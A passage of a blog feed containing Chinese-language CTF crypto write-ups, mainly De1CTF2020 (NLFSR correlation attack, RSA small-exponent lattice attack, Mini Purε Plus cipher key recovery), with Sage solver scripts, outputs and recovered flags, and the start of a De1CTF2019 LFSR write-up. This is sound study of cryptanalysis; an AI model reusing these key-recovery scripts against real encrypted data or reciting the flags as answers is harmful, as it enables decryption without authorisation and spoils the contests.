src= "/img/loading.gif" data-src="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/TzFGhGpqfDJCncgl.png" alt></p><h3 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h3><p>？</p><p>md5在线查库 + 三元一次方程 + 一元二次方程（绝了</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(De1CTF2020) - Crypto</title>
      <link href="/2020/05/04/WriteUp-De1CTF2020-Crypto/"/>
      <url>/2020/05/04/WriteUp-De1CTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="NLFSR"><a href="#NLFSR" class="headerlink" title="NLFSR"></a>NLFSR</h3><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>分析源码发现是四个LFSR组合成的加密系统，相关系数分析如下：</p><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-04_16-26-21.png" alt></p><p>发现第一个LFSR相关系数0.75，相关攻击即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(p, mask, partMask)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        single_cipher = single_lfsr(a, mask, partMask, len(cipher))</span><br><span class="line">        correlation_value = correlation(single_cipher, cipher)</span><br><span class="line">        <span class="keyword">if</span> correlation_value &gt;= (p - <span class="number">0.05</span>) <span class="keyword">and</span> correlation_value &lt;= (p + <span class="number">0.05</span>):</span><br><span class="line">            print(<span class="string">"a is &#123;&#125;"</span>.format(a))</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>得到 a = 363445</p><p>因为$x_{2}=0$时，$value=x_3\oplus x_4$；$x_2=1$时，$value=x_1$，所以第一个LFSR流与最终流不一致的比特位上，第二个LFSR流一定为0</p><p>取第一个LFSR流与最终流不一致的至少19个比特位，即可恢复b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">single_cipher_a = single_lfsr(a, ma, partMask, len(cipher))</span><br><span class="line"></span><br><span class="line">b0_pos = [] <span class="comment">#b==0的下标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2048</span>):</span><br><span class="line">    <span class="keyword">if</span> cipher[i] != single_cipher_a[i]:</span><br><span class="line">        b0_pos.append(i)</span><br><span class="line">b0_pos = b0_pos[:<span class="number">19</span>]</span><br><span class="line">        </span><br><span class="line">mb = <span class="number">0x40f3f</span></span><br><span class="line"></span><br><span class="line">mb_feedback = []</span><br><span class="line">mb_bin = bin(mb)[<span class="number">2</span>:].rjust(<span class="number">24</span>, <span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">if</span> mb_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">        mb_feedback.append(i)</span><br><span class="line">mb_feedback.append(<span class="number">24</span>)</span><br><span class="line">mb_feedback = [_ - <span class="number">5</span> <span class="keyword">for</span> _ <span class="keyword">in</span> mb_feedback]</span><br><span class="line"><span class="comment"># mb_feedback = [0, 7, 8, 9, 10, 13, 14, 15, 16, 17, 18]</span></span><br><span class="line"></span><br><span class="line">cur = []</span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    v = vector(F2, <span class="number">19</span>)</span><br><span class="line">    v[i] = <span class="number">1</span></span><br><span class="line">    cur.append(v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    v = vector(F2, <span class="number">19</span>)</span><br><span class="line">    cur19 = cur[<span class="number">-19</span>:]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> mb_feedback:</span><br><span class="line">        v += cur19[j]</span><br><span class="line">    cur.append(v)</span><br><span class="line">    </span><br><span class="line">cur = cur[<span class="number">19</span>:]</span><br><span class="line"></span><br><span class="line">left = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b0_pos:</span><br><span class="line">    left.append(list(cur[i]))</span><br><span class="line">A = Matrix(F2, left)</span><br><span class="line"></span><br><span class="line">A.right_kernel()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-04_16-26-15.png" alt>      </p><p>于是得到 b = 0b1111000110101010110 = 494934</p><p>最后两个LFSR组成的密钥空间$2^{19}$，直接爆破即可</p><p>得到 c = 4406，d = 63</p><h3 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h3><h4 id="题解分析-1"><a href="#题解分析-1" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>给出$e_{1},e_{2}$，对应的私钥满足</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit = gmpy2.iroot(n,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">r = random.randint(limit,limit*<span class="number">0x1000000000001</span>)</span><br><span class="line">d = gmpy2.next_prime(r)</span><br></pre></td></tr></table></figure><p>2048 bits N下的这个上界(731 bits)显然不满足Wiener和Boneh Durfee，因此采用这篇<a href="howgrave-graham1999.pdf">paper</a>下的攻击方法：</p><p>$g=gcd(p-1,q-1),\lambda(n)=\frac{\varphi(n)}{g},s=1-p-q$</p><p>且有$ed-k\lambda(n)=1$，得到$edg-kn=g+ks\quad (1)$</p><p>设$e_{1}$对应$k_{1}$，$e_{2}$对应$k_{2}$，则有$k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\quad (2)$</p><p>由(1)(2)有：</p><script type="math/tex; mode=display">\left\{\begin{matrix}e_{1}d_{1}g-k_{1}n=g+k_{1}s\\k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\\e_{1}e_{2}d_{1}d_{2}g_{2}-e_{1}d_{1}gk_{2}n-e_{2}d_{2}gk_{1}n+k_{1}k_{2}n^{2}=(g+k_{1}s)(g+k_{2}s)\end{matrix}\right.</script><p>上述等式组也可表示为</p><script type="math/tex; mode=display">[k_{1}k_{2},k_{2}d_{1}g,k_{1}d_{2}g,d_{1}d_{2}g^{2}]\cdot\left[\begin{matrix}n & -M_{1}n & 0 & n^{2}\\0 & M_{1}e_{1} & M_{2}e_{1} & -e_{1}n\\0 & 0 & -M_{2}e_{2} & -e_{2}n\\0 & 0 & 0 & e_{1}e_{2}\end{matrix}\right]\\=[k_{1}k_{2}n,M_{1}k_{2}(g+k_{1}s),M_{2}g(k_{2}-k_{1})，(g+k_{1}s)(g+k_{2}s)]</script><p>(其中$M_{1}=n^{1/2},M_{2}=n^{1+\alpha_{2}},d\approx n^{\alpha_{2}}$.)</p><p>对部分参数进行上界估计，k上界近似于$d\approx N^{\alpha_{2}}$，$|s|$上界$\approx N^{1/2}$，g一般相对极小</p><p>因此上面的矩阵表示BA=C中，C的每个元的size都近似$n^{1+2\alpha_{2}}$，所以$|C|\approx 2\cdot n^{1+2\alpha_{2}}$</p><p>B作为格基的格中，最短向量由Minkowski Bounds知$\approx \sqrt{4}det(B)^{1/4}\approx 2\cdot n^{(13/2+\alpha_{2})/4}$</p><p>因此只要满足$n^{1+2\alpha_{2}}&lt;n^{(13/2+\alpha_{2})/4}$即可将问题转化为SVP（$\alpha_{2}&lt;\frac{5}{14}$）.</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">731</span>, <span class="number">682</span>, <span class="number">-1</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    alpha2 = i / <span class="number">2048</span></span><br><span class="line">    M1 = round(n ^ <span class="number">0.5</span>)</span><br><span class="line">    M2 = round(n ^ (<span class="number">1</span> + alpha2))</span><br><span class="line">    A = Matrix(ZZ, [</span><br><span class="line">        [n, -M1*n,      <span class="number">0</span>,   n^<span class="number">2</span>],</span><br><span class="line">        [<span class="number">0</span>, M1*e1, -M2*e1, -e1*n],</span><br><span class="line">        [<span class="number">0</span>,     <span class="number">0</span>,  M2*e2, -e2*n],</span><br><span class="line">        [<span class="number">0</span>,     <span class="number">0</span>,      <span class="number">0</span>, e1*e2]</span><br><span class="line">    ])</span><br><span class="line">    AL = A.LLL()</span><br><span class="line">    C = Matrix(ZZ, AL[<span class="number">0</span>])</span><br><span class="line">    B = A.solve_left(C)[<span class="number">0</span>]</span><br><span class="line">    phi1 = floor(e1 * B[<span class="number">1</span>] / B[<span class="number">0</span>])</span><br><span class="line">    phi2 = floor(e2 * B[<span class="number">2</span>] / B[<span class="number">0</span>])</span><br><span class="line">    d1 = inverse(e1, phi1)</span><br><span class="line">    d2 = inverse(e2, phi2)</span><br><span class="line">    m1 = long_to_bytes(pow(c, d1, n))</span><br><span class="line">    m2 = long_to_bytes(pow(c, d2, n))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"De1"</span> <span class="keyword">in</span> m1 <span class="keyword">or</span> <span class="string">b"De1"</span> <span class="keyword">in</span> m2:</span><br><span class="line">        print(m1)</span><br><span class="line">        print(m2)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-06_01-20-35.png" alt></p><p>可以发现727 bits的时候LLL求解SVP成功</p><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>Day1晚上coin和我说是d3原题…只不过是size(d)只有一个范围，$\alpha_{2}$要进行调整（原理理解起来不难…还是做题太少- -</p><h3 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a>ECDH</h3><p>没看-.-shallow师傅自己一个人a掉了tql</p><p>（题解分析视时间补充</p><h3 id="Mini-Purε-Plus"><a href="#Mini-Purε-Plus" class="headerlink" title="Mini Purε Plus"></a>Mini Purε Plus</h3><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>De1CTF2019也出过Purε，但那时候考察的是最基本的插值攻击，加密的轮次也只有6轮，今年ROUND提升到16后，直接排除一般的插值攻击</p><p>由题目分析知，给出pt的左半边均固定，所以输入形式为$(C, x),C\in GF(2^{24})$，查阅资料找到以下算法：</p><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/QQ图片20200506013028.jpg" alt></p><p>但实现以后发现计算$3^{15}+1$个(x, y)的拉格朗日插值多项式时间复杂度接近$O(2^{48})$</p><p>晚上又在上面的算法基础上，加了中间相遇的优化，将问题转化为n元1次方程组的求解，时间复杂度上可行，但$n\approx 40000$，内存消耗直接飙到2T，难顶</p><p><strong>[赛后复现]</strong></p><p>De1ta官方wp用的做法是高次积分攻击，原理分析起来也不难，但这里用的是rank1队伍用的另一种解法（借助$GF(2^{24})$上的单位根）</p><p>他们一开始用的也是中间相遇攻击，即用$g(x)$和$h(y,z)$作为purε正向和逆向的函数表示</p><p>对于第i轮的输出左侧，$deg_{x}(g)=3^{i-1}$，对于右侧，$deg_{x}(g)=3^{i}$；</p><p>逆向来看，对于左侧，$deg_{y}(h)=3^{16-m},deg_{z}(h)=3^{15-m}$，右侧，$deg_{y}(h)=3^{15-m},deg_{z}(h)=3^{14-m}$.</p><p>但如果直接中间相遇攻击求解多项式的系数，就会遇到先前我说的空间复杂度凉凉</p><p>所以他们丢弃了$h(y,z)$，改用$g(x)$和单位根进行求解，具体如下：</p><p>$GF(2^{24})^{*}$上，基于阶为$2^{24}-1$的事实，任意d次单位根$\omega$都可表示为$g^{\frac{2^{24}-1}{d}}$（g为$GF(2^{24})$上的生成元）</p><p>且$1+\omega+\omega^{2}+…+\omega^{d-1}=0$，易知$\sum_{i=0}^{d-1}\omega^{ij}=0$在$d\nmid j$时均成立，反之≠0（画个单位圆差不多就get了</p><p>所以随机取$a\in GF(2^{24})$，在$deg(g)&lt;d$时，均有</p><script type="math/tex; mode=display">\sum^{d-1}_{i=0}g(a\omega^{i})=g(0)</script><p>设第i轮后的密文为$(l_{i},r_{i})$，则第i-1轮后的密文为$(r_{i}+(l_{i}+k_{i})^{3},l_{i})=((r_{i}+l_{i}^{3})+l_{i}^{2}k_{i}+l_{i}k_{i}^{2}+k_{i}^{3},l_{i})$</p><p>可以看到第i-1轮左侧$k_{i}$的依赖项为$l_{i}^{2},l_{i}$，再基于前面提到的第i轮时，左侧$deg_{x}(g)=3^{i-1}$，如果$l_{i}$的$degree&lt;d$，则$g(0)+\sum l_{i}=0$，且$k_{i}^{3}$的系数1一定累加偶数次（因为$d\mid (2^{24}-1)\Rightarrow 2\nmid d$），即累加后三次项的系数一定为0，这样就会导致所有$k_{i}$的依赖项等于0，求解失败</p><p>于是令$3^{i-1}&gt;d,3^{i-2}&lt;d,d\mid (2^{24}-1)$，比如求解k15时，取$d=\frac{2^{24}-1}{3}$，求解k14时，$d//=3$，问题转化为向量相加并求解二次方程根，时间复杂度控制在$O(2^{24})$下</p><p>求解出k14,k15后，根据题目中最后给出的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = sympy.nextprime(<span class="number">2</span>**<span class="number">24</span>)</span><br><span class="line">arr = np.random.randint(<span class="number">0</span>,p,(ROUND,ROUND<span class="number">-2</span>),dtype=<span class="string">'int64'</span>)</span><br><span class="line">keys = np.array(keys)</span><br><span class="line">res = np.mod(np.dot(keys,arr),p)</span><br></pre></td></tr></table></figure><p>问题即转化为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = next_prime(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">A = Matrix(Fp, <span class="number">16</span>, <span class="number">14</span>, arr[:<span class="number">16</span>*<span class="number">14</span>])</span><br><span class="line">B = vector(Fp, arr[<span class="number">-14</span>:])</span><br><span class="line">K = A.delete_rows([<span class="number">14</span>, <span class="number">15</span>]).solve_left(B - k14 * A[<span class="number">14</span>] - k15 * A[<span class="number">15</span>])</span><br></pre></td></tr></table></figure><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">toF = F.fetch_int</span><br><span class="line">fromF = <span class="keyword">lambda</span> i : i.integer_representation()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get data</span></span><br><span class="line">data = dict()</span><br><span class="line"><span class="keyword">for</span> pt, ct <span class="keyword">in</span> zip(open(<span class="string">'pt.txt'</span>), open(<span class="string">'ct.txt'</span>)):</span><br><span class="line">    pt = pt.rstrip(<span class="string">'\n'</span>)</span><br><span class="line">    ptr = toF(int(pt[<span class="number">6</span>:], <span class="number">16</span>))</span><br><span class="line">    ct = ct.rstrip(<span class="string">'\n'</span>)</span><br><span class="line">    ctl = toF(int(ct[:<span class="number">6</span>], <span class="number">16</span>))</span><br><span class="line">    ctr = toF(int(ct[<span class="number">6</span>:], <span class="number">16</span>))</span><br><span class="line">    data[ptr] = (ctl, ctr)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">omega = F.gen()^<span class="number">3</span> <span class="comment"># ((2^24-1)/3)th root of unity</span></span><br><span class="line">poly = vector(F, <span class="number">4</span>) <span class="comment"># polynomial for k_15</span></span><br><span class="line">a = toF(<span class="number">2333</span>) <span class="comment"># ini</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range((<span class="number">2</span>**<span class="number">24</span><span class="number">-1</span>)//<span class="number">3</span>)):</span><br><span class="line">    r, l = data[a] <span class="comment"># swap</span></span><br><span class="line">    v = vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">    poly += v</span><br><span class="line">    a *= omega</span><br><span class="line">r, l = data[toF(<span class="number">0</span>)]</span><br><span class="line">poly += vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><pre><code>100%|██████████| 5592405/5592405 [04:04&lt;00:00, 22915.12it/s]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">R = PolynomialRing(F, names=<span class="string">'k'</span>)</span><br><span class="line">k = R.gen()</span><br><span class="line">eq = poly[<span class="number">0</span>] + poly[<span class="number">1</span>] * k + poly[<span class="number">2</span>] * k^<span class="number">2</span> + poly[<span class="number">3</span>] * k^<span class="number">3</span></span><br><span class="line">k15s = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> eq.roots()]</span><br><span class="line">print([fromF(_) <span class="keyword">for</span> _ <span class="keyword">in</span> k15s])</span><br></pre></td></tr></table></figure><pre><code>[4122190, 14944194]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">k1415 = []</span><br><span class="line"><span class="keyword">for</span> k15 <span class="keyword">in</span> k15s:</span><br><span class="line">    omega = F.gen()^<span class="number">9</span> <span class="comment"># ((2^24-1)/9)th root of unity</span></span><br><span class="line">    poly = vector(F, <span class="number">4</span>) <span class="comment"># polynomial for k_14</span></span><br><span class="line">    a = toF(<span class="number">2333</span>) <span class="comment"># ini</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range((<span class="number">2</span>**<span class="number">24</span><span class="number">-1</span>)//<span class="number">9</span>)):</span><br><span class="line">        r, l = data[a] <span class="comment"># swap</span></span><br><span class="line">        l, r = r + (l + k15) ^ <span class="number">3</span>, l</span><br><span class="line">        v = vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">        poly += v</span><br><span class="line">        a *= omega</span><br><span class="line">    r, l = data[toF(<span class="number">0</span>)]</span><br><span class="line">    l, r = r + (l + k15) ^ <span class="number">3</span>, l</span><br><span class="line">    poly += vector(F, [l ^ <span class="number">3</span> + r, l ^ <span class="number">2</span>, l, <span class="number">1</span>])</span><br><span class="line">    eq = poly[<span class="number">0</span>] + poly[<span class="number">1</span>] * k + poly[<span class="number">2</span>] * k^<span class="number">2</span> + poly[<span class="number">3</span>] * k^<span class="number">3</span></span><br><span class="line">    k14s = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> eq.roots()]</span><br><span class="line">    <span class="keyword">for</span> k14 <span class="keyword">in</span> k14s:</span><br><span class="line">        k1415.append((fromF(k14), fromF(k15)))</span><br><span class="line">        print((fromF(k14), fromF(k15)))</span><br></pre></td></tr></table></figure><pre><code>100%|██████████| 1864135/1864135 [01:27&lt;00:00, 21343.81it/s]  0%|          | 2069/1864135 [00:00&lt;01:30, 20685.68it/s](2216205, 4122190)(14035807, 4122190)100%|██████████| 1864135/1864135 [01:26&lt;00:00, 21605.20it/s](5546654, 14944194)(9208218, 14944194)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">arr = re.findall(<span class="string">r"\d+"</span>, open(<span class="string">"data.txt"</span>, <span class="string">"r"</span>).read())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = next_prime(<span class="number">2</span>^<span class="number">24</span>)</span><br><span class="line">Fp = Zmod(p)</span><br><span class="line">A = Matrix(Fp, <span class="number">16</span>, <span class="number">14</span>, arr[:<span class="number">16</span>*<span class="number">14</span>])</span><br><span class="line">B = vector(Fp, arr[<span class="number">-14</span>:])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ks = []</span><br><span class="line"><span class="keyword">for</span> k14, k15 <span class="keyword">in</span> k1415:</span><br><span class="line">    K = A.delete_rows([<span class="number">14</span>, <span class="number">15</span>]).solve_left(B - k14 * A[<span class="number">14</span>] - k15 * A[<span class="number">15</span>])</span><br><span class="line">    Ks.append(K.list() + [k14, k15])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> Ks:</span><br><span class="line">    l = toF(<span class="number">0x777777</span>)</span><br><span class="line">    r = toF(<span class="number">2333</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        l , r = r , l + (r + toF(int(k[i]))) ^ <span class="number">3</span></span><br><span class="line">    l, r = r, l</span><br><span class="line">    <span class="keyword">if</span> (l, r) == data[toF(<span class="number">2333</span>)]:</span><br><span class="line">        key = k</span><br><span class="line">        print(key)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><pre><code>[16359893, 9091260, 11254674, 353718, 5395716, 9319892, 2360013, 12784246, 9857353, 2940944, 964650, 3296014, 7022345, 198188, 9208218, 14944194]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'d519b93b0fd950bdf1e1c321fc32e4c4c4b225b80c1ba091f31217b90132ed107e1f6b1c9dd60ba0eafcdd5923764c46'</span></span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher), <span class="number">12</span>):</span><br><span class="line">    r, l = toF(int(cipher[i:i+<span class="number">6</span>], <span class="number">16</span>)), toF(int(cipher[i+<span class="number">6</span>:i+<span class="number">12</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        l, r = r + (l + toF(int(key[<span class="number">15</span>-j]))) ^ <span class="number">3</span>, l</span><br><span class="line">    l, r = fromF(l), fromF(r)</span><br><span class="line">    flag += (long_to_bytes(l) + long_to_bytes(r))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><pre><code>b&#39;De1CTF{6a2ddcc3-c729-48f8-b5e0-7574c46a2846}\x04\x04\x04\x04&#39;</code></pre><h4 id="More-1"><a href="#More-1" class="headerlink" title="[More]"></a>[More]</h4><p>比赛期间其实已经找到高次积分攻击相关的内容了- -但是他后面给了张表（15 ROUND要跑31h），直接劝退，看到官方wp的时候（一脸懵），然后再看了下表上的测试用cpu，奔腾4…👴佛辣</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Training-Record-1</title>
      <link href="/2020/04/30/CTF-Training-Record-1/"/>
      <url>/2020/04/30/CTF-Training-Record-1/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>CTF-Training-Record系列仅用于作部分CTF刷题记录，不定期更新</p><h3 id="De1CTF2019-Babylfsr"><a href="#De1CTF2019-Babylfsr" class="headerlink" title="De1CTF2019 - Babylfsr"></a>De1CTF2019 - Babylfsr</h3><h4 id="题目考点"><a href="#题目考点" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>BM algorithm</li></ul><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="Babylfsr.zip">Click Here to Download</a></p><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>(FLAG==<span class="string">"de1ctf&#123;"</span>+hashlib.sha256(hex(KEY)[<span class="number">2</span>:].rstrip(<span class="string">'L'</span>)).hexdigest()+<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(FLAG[<span class="number">7</span>:<span class="number">11</span>]==<span class="string">'1224'</span>)</span><br><span class="line"></span><br><span class="line">LENGTH = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(KEY.bit_length()==LENGTH)</span><br><span class="line"><span 